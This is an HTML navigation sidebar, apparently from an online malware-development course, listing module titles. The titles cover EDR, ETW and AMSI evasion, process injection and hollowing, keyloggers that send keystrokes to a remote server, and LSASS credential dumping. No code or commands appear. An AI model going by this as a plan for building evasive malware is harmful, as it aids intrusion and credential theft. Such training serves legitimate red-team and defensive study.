                    <div for="module-3" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 3 - Custom WinAPI Functions
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-4" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./4.html">
                    <div for="module-4" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 4 - Exploiting EDRs For Evasion
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-5" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./5.html">
                    <div for="module-5" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 5 - Introduction To MASM Assembly
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-6" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./6.html">
                    <div for="module-6" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 6 - Evasion With File Bloating
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-7" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./7.html">
                    <div for="module-7" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 7 - Bring Your Own Protocol Handler
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-8" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./8.html">
                    <div for="module-8" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 8 - Bring Your Own File Extension
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-9" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./9.html">
                    <div for="module-9" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 9 - Utilizing Hardware Breakpoints For Hooking (1)
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-10" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./10.html">
                    <div for="module-10" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 10 - Utilizing Hardware Breakpoints For Hooking (2)
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-11" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./11.html">
                    <div for="module-11" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 11 - Utilizing Hardware Breakpoints For Credential Dumping
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-12" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./12.html">
                    <div for="module-12" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 12 - Event Tracing For Windows - Introduction
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-13" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./13.html">
                    <div for="module-13" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 13 - Event Tracing For Windows - ETW Tools
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-14" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./14.html">
                    <div for="module-14" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 14 - Event Tracing For Windows - ETW Bypass Via Byte Patching
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-15" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./15.html">
                    <div for="module-15" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 15 - Event Tracing for Windows - Improved Patching
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-16" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./16.html">
                    <div for="module-16" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 16 - Event Tracing for Windows - Patchless ETW Bypass Via HBPs
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-17" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./17.html">
                    <div for="module-17" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 17 - Event Tracing For Windows - ETW Provider Session Hijacking
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-18" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./18.html">
                    <div for="module-18" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 18 - Antimalware Scan Interface - Introduction
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-19" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./19.html">
                    <div for="module-19" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 19 - Antimalware Scan Interface - AMSI Bypass Via Byte Patching
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-20" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./20.html">
                    <div for="module-20" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 20 - Antimalware Scan Interface - AMSI Bypass Via HBPs
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-21" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./21.html">
                    <div for="module-21" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 21 - Building a DRM-equipped Malware
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-22" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./22.html">
                    <div for="module-22" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 22 - Introduction to Havoc C&amp;C
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-23" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./23.html">
                    <div for="module-23" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 23 - Building An Evasive DLL Payload Loader
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-24" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./24.html">
                    <div for="module-24" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 24 - Introduction To DLL Sideloading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-25" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./25.html">
                    <div for="module-25" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 25 - Practical DLL Sideloading Example
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-26" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./26.html">
                    <div for="module-26" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 26 - DLL Sideloading For EDR Evasion
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-27" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./27.html">
                    <div for="module-27" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 27 - Bring Your Own Vulnerable Driver
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-28" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./28.html">
                    <div for="module-28" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 28 - Local PE Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-29" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./29.html">
                    <div for="module-29" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 29 - Reflective DLL Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-30" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./30.html">
                    <div for="module-30" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 30 - PeFluctuation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-31" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./31.html">
                    <div for="module-31" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 31 - Building a PE Packer
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-32" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./32.html">
                    <div for="module-32" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 32 - Malware Directory Placement
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-33" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./33.html">
                    <div for="module-33" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 33 - Utilizing Fibers For Payload Execution
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-34" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./34.html">
                    <div for="module-34" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 34 - TLS Callbacks For Anti-Debugging
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-35" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./35.html">
                    <div for="module-35" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 35 - Threadless Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-36" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./36.html">
                    <div for="module-36" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 36 - Module Stomping
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-37" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./37.html">
                    <div for="module-37" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 37 - Module Overloading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-38" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./38.html">
                    <div for="module-38" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 38 - Process Hollowing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-39" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./39.html">
                    <div for="module-39" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 39 - Ghost Process Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-40" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./40.html">
                    <div for="module-40" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 40 - Ghostly Hollowing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-41" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./41.html">
                    <div for="module-41" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 41 - Herpaderping Process Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-42" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./42.html">
                    <div for="module-42" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 42 - Herpaderply Hollowing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-43" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./43.html">
                    <div for="module-43" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 43 - Shellcode Reflective DLL Injection (sRDI)
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-44" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./44.html">
                    <div for="module-44" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 44 - Patchless Threadless Injection Via Hardware BreakPoints
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-45" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./45.html">
                    <div for="module-45" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 45 - Tampered Syscalls Via Hardware BreakPoints
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-46" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./46.html">
                    <div for="module-46" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 46 - Exploiting EDRs For Evasion - Preventing EDR From Taking Action
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-47" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./47.html">
                    <div for="module-47" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 47 - Exploiting EDRs For Evasion - EDR LOLBINS
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-48" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./48.html">
                    <div for="module-48" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 48 - Process Hypnosis
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-49" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./49.html">
                    <div for="module-49" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 49 - Introduction To Object Files
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-50" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./50.html">
                    <div for="module-50" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 50 - Writing Beacon Object Files
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-51" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./51.html">
                    <div for="module-51" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 51 - Object File Loading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-52" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./52.html">
                    <div for="module-52" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 52 - Exploiting EDRs For Evasion - Finding Internal Exclusion List
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-53" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./53.html">
                    <div for="module-53" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 53 - Introduction To Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-54" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./54.html">
                    <div for="module-54" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 54 - Introduction to Ekko and Zilean Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-55" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./55.html">
                    <div for="module-55" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 55 - Introduction to Foliage Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-56" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./56.html">
                    <div for="module-56" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 56 - Implementing Ekko With Stack Spoofing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-57" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./57.html">
                    <div for="module-57" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 57 - Token Manipulation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-58" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./58.html">
                    <div for="module-58" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 58 - Library Proxy Loading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-59" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./59.html">
                    <div for="module-59" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 59 - Heap Encryption With Ekko Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-60" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./60.html">
                    <div for="module-60" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 60 - Introduction To Executing .NET Assemblies 
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-61" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./61.html">
                    <div for="module-61" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 61 - Evading Microsoft Defender Via Patching 
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-62" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./62.html">
                    <div for="module-62" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 62 - .NET Assemblies - Patching System.Environment.Exit
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-63" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./63.html">
                    <div for="module-63" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 63 - Capturing And Saving Screenshots Into Memory
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-64" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./64.html">
                    <div for="module-64" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 64 - Cross-Architecture Injection: x86 to x64 Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-65" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./65.html">
                    <div for="module-65" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 65 - KnownDll Cache Poisoning Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-66" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./66.html">
                    <div for="module-66" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 66 - Introduction to Keylogging
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-67" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./67.html">
                    <div for="module-67" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 67 - Developing a Keylogger
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-68" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./68.html">
                    <div for="module-68" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 68 - Sending Keystrokes To Remote Server
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-69" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./69.html">
                    <div for="module-69" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 69 - Manipulating VEH For Local Code Execution 
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-70" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./70.html">
                    <div for="module-70" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 70 - Introduction To LSASS Dumping
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-71" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./71.html">
                    <div for="module-71" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 71 - Fetching LSASS Handle And Bypassing PPL
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-72" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./72.html">
                    <div for="module-72" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 72 - LSASS Dump Via Handle Duplication
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-73" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./73.html">
                    <div for="module-73" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 73 - LSASS Dump Via RtlReportSilentProcessExit
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-74" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./74.html">
                    <div for="module-74" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 74 - LSASS Dump Via Seclogon Race Condition
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-75" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
